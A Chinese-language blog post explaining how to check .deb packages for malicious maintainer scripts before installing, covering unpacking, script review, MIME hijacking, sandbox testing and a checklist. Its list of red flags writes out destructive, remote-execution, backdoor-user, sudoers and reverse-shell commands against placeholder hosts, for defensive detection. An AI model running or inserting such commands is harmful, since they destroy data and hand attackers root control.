---
title: 如何检查 .deb 安装包是否包含恶意代码
author: "Zhao Zilong"
date: 2024-10-28
category: Linux
layout: post
---



安装 `.deb` 包时，如果其中包含恶意脚本，它们会以 **root 权限** 执行，因此安装前进行安全检查非常重要。
 本笔记记录了从解包、查看脚本到判断风险的完整流程。

------

## 📦 1. `.deb` 包内部结构简介

Debian 安装包中可能包含若干**维护脚本（Maintainer Scripts）**，它们由 `dpkg` 在安装、升级或卸载时执行：

路径一般位于：

```
DEBIAN/postinst
DEBIAN/preinst
DEBIAN/prerm
DEBIAN/postrm
DEBIAN/triggers
```

这些脚本都可能执行任意命令，包括恶意操作，因此必须检查。

------

## 🔍 2. 不需要安装即可解包 `.deb`

使用以下命令将包内容解压到指定目录：

### 解压数据文件（程序实际内容）

```bash
dpkg-deb -x package.deb extract/
```

### 解压控制文件（包含脚本）

```bash
dpkg-deb -e package.deb extract/DEBIAN
```

最终目录结构如下：

```
extract/
├── opt/ 或 usr/（程序文件）
└── DEBIAN/
    ├── postinst
    ├── preinst
    ├── postrm
    ├── prerm
    └── control
```

------

## 📜 3. 检查所有 `DEBIAN/*.sh` 维护脚本

重点查看：

### ✔️ `postinst`（安装后执行）

最危险，因为安装完成时自动以 root 执行。

### ✔️ `preinst`（安装前执行）

也能做恶意操作，例如删除系统文件。

### ✔️ 卸载脚本 `prerm / postrm`

恶意包可能在卸载时执行破坏行为（如 rm -rf /home）。

### ✔️ `triggers` 文件

触发系统其他包的脚本执行，有可能引出额外行为。

------

## 🕵️‍♂️ 4. 重点检查脚本中的可疑内容

寻找以下危险命令：

### ❌ **文件破坏类**

```
rm -rf /
rm -rf /home
rm -rf ~/.config
```

### ❌ **网络访问 / 远程执行**

```
curl http://evil | bash
wget http://malware
nc attacker
```

### ❌ **创建后门用户**

```
useradd hacker
echo 'hacker:password' | chpasswd
```

### ❌ **权限提升 & 修改 sudoers**

```
chmod 777 /
echo 'ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

### ❌ **非法监听 / 反向 shell**

```
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
```

### ❌ **劫持系统服务**

```
systemctl enable malicious.service
```

------

## 🔧 5. 检查桌面文件是否劫持 MIME 类型或默认应用

查看以下目录：

```
/usr/share/applications/*.desktop
~/.config/mimeapps.list
```

检查是否：

- 修改默认浏览器
- 劫持 html 打开方式
- 注册异常 URL protocol

------

## 📚 6. 检查 triggers 执行了哪些脚本

`dpkg` 在安装时执行：

```
Processing triggers for xxxx ...
```

对应脚本位于：

```
/var/lib/dpkg/info/xxx.postinst
/var/lib/dpkg/info/xxx.triggers
```

一般用于更新缓存，如：

- `desktop-file-utils`
- `hicolor-icon-theme`
- `mime-support`

不是恶意行为，但仍需了解它们会执行脚本。

------

## 🧪 7. 可选择在虚拟机 /容器环境测试执行过程

为了安全起见，可以在隔离环境中测试：

### 使用 LXC/LXD

```bash
lxc launch ubuntu:22.04 test-env
lxc file push package.deb test-env/
```

### 使用 Docker

```bash
docker run -it --rm ubuntu:22.04 bash
```

在里面运行：

```bash
dpkg -i package.deb
```

监控 `/var/log/syslog`、文件改动、进程行为等。

------

## ✅ 8. 最终判断是否安全的 checklist

| 检查项                                     | 是否正常 |
| ------------------------------------------ | -------- |
| postinst / preinst 中是否无恶意 shell 命令 | ✔️        |
| 是否无远程脚本、curl、wget                 | ✔️        |
| 是否未添加用户或修改 sudoers               | ✔️        |
| 是否未影射浏览器、文本编辑器等关键默认应用 | ✔️        |
| 是否无异常 systemd 服务或监听端口          | ✔️        |
| triggers 调用了哪些脚本                    | ✔️        |

全部通过即可判定 `.deb` 包安全性较高。

------

# 📌 总结

### **检查 .deb 包是否安全的标准流程：**

1. **解包查看内容**（不安装）
2. **重点审查 DEBIAN 目录下脚本**
3. **查找危险命令或行为**
4. **检查 MIME / .desktop 劫持情况**
5. **审查 triggers 的影响**
6. **必要时在隔离环境实测**

做到以上步骤后，基本能排除绝大多数恶意 `.deb` 包的风险。

------


